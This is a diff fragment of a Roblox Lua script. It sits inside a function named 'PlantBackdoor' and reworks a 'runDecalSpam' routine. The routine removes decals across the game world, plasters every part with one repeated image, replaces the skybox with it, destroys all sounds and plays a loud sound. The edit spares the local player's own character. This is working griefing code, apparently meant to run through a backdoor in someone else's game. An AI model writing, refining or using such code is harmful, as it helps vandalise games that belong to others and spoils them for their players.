@@ -476,37 +476,36 @@ local function PlantBackdoor()
                 gui:Destroy()
             end
         end
-
-        local function runDecalSpam()
-            local function exPro(root)
-                for _, v in pairs(root:GetChildren()) do
-                    if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
-                        v.Parent = nil
-                    elseif v:IsA("BasePart") then
-                        v.Material = Enum.Material.Plastic
-                        v.Transparency = 0
-                        for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
-                            local d = Instance.new("Decal", v)
-                            d.Texture = "rbxassetid://8408806737"
-                            d.Face = face
-                        end
-                    end
-                    exPro(v)
+local function runDecalSpam()
+    local function exPro(root)
+        for _, v in ipairs(root:GetChildren()) do
+            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
+                v.Parent = nil
+            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
+                v.Material = Enum.Material.Plastic
+                v.Transparency = 0
+                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
+                    local d = Instance.new("Decal", v)
+                    d.Texture = "rbxassetid://8408806737"
+                    d.Face = face
                 end
             end
-            local sky = Instance.new("Sky")
-            sky.SkyboxBk = "rbxassetid://8408806737"
-            sky.SkyboxDn = "rbxassetid://8408806737"
-            sky.SkyboxFt = "rbxassetid://8408806737"
-            sky.SkyboxLf = "rbxassetid://8408806737"
-            sky.SkyboxRt = "rbxassetid://8408806737"
-            sky.SkyboxUp = "rbxassetid://8408806737"
-            sky.Parent = Lighting
-            Lighting.TimeOfDay = 12
-            exPro(Workspace)
-            for _, v in pairs(Workspace:GetChildren()) do
-                if v:IsA("Sound") then v:Stop(); v:Destroy() end
-end
+            exPro(v)
+        end
+    end
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://8408806737"
+    sky.SkyboxDn = "rbxassetid://8408806737"
+    sky.SkyboxFt = "rbxassetid://8408806737"
+    sky.SkyboxLf = "rbxassetid://8408806737"
+    sky.SkyboxRt = "rbxassetid://8408806737"
+    sky.SkyboxUp = "rbxassetid://8408806737"
+    sky.Parent = Lighting
+    Lighting.TimeOfDay = 12
+    exPro(Workspace)
+    for _, v in ipairs(Workspace:GetChildren()) do
+        if v:IsA("Sound") then v:Stop(); v:Destroy() end
+    end
     local snd = Instance.new("Sound")
     snd.SoundId = "rbxassetid://72089843969979"
     snd.Volume = 10
